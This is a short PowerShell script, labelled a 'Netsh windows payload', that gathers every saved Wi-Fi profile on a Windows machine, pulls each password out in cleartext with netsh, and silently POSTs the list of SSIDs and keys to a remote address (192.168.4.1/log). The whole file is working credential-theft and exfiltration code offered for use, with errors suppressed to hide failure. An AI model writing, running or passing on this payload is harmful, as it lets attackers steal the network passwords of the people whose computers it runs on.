# Netsh windows payload 

# Collect profile names
$profiles = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })

$report = ""

# Get passwords
foreach ($name in $profiles) {
    $content = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
    
    if ($content) {
        $report += "SSID: $name | Pass: $content`n"
    } else {
        # Open 
        $report += "SSID: $name | Pass: [OPEN/NO KEY]`n"
    }
}

# Send data
try {
    Invoke-WebRequest -Uri "http://192.168.4.1/log" -Method Post -Body $report -TimeoutSec 5
} catch {
    # Silent
}
